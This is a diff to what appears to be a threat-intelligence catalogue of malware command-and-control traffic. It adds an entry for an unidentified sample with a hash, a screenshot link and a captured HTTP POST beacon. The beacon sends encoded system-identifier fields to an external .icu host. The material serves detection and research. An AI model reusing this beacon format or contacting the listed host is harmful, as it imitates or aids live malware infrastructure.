@@ -832,3 +832,20 @@ M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
+
+### Unknowns
+#########################################################################################################
+
+#### Unknownmalware4
+h/t @thlnk3r, hash 0f220c1bd968fe68b729ae3a39f00958bae021169fa9afb0d659beb14f19f7a5
+~~~
+POST /jab2/s.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+Content-Length: 372
+Host: dsfhhhhf44555.icu
+
+key=%15%08%00%15%07%12%14%12%02%12%12&sysid=%09%02%07D96%1A%1D%02%0E%04%00FVS+%03%13%05%1A%05%04S%23%07%02%18SWA%5B%25%03%13%00%1A%09%0FSEHP_S%24%14%1A%1F%02ADEVP_SPU%5E%11%0F%15S6%02%08%07%1A%09%0FZ%2C%1EWG%2C94+64L%230BZ%12%17%0B%08%1D%2C%11%08%1D%12%05%02I%00%13%11%03%1C%14%15%12%10%05%0E%06%1D%12Z%1F%3B%1E%24B1%0B%07H%2CSTEJU&resp=%09%0A&rights=%00%07%15%15%00&misc=
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownmalware4.png "Unknownmalware4")
